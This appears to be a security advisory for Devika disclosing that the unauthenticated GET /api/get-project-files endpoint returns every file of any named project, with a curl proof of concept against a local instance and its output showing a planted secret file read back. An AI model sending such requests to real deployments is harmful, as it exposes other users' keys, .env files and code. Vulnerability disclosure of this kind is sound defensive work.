# Devika: unauthenticated cross-project file read via GET /api/get-project-files

## Description

`GET /api/get-project-files` (src/project.py:148-174) walks `data/projects/<project_name>/` for the given parameter and returns the full text of every readable file — no authentication and no ownership binding; project names are enumerable.

## Impact

Any network client that can reach port 1337 reads all source/data files of other projects (project directories may contain .env files, keys, internal code).

## PoC

```bash
# Prerequisite: victim project exists at data/projects/victim-project/SECRET.txt
#               (content: "victim secret data 42")
curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
```

## Execution result

```
$ curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
{"files":[{"code":"victim secret data 42\n","file":"SECRET.txt"}]}
[GET variant HTTP 200]
```
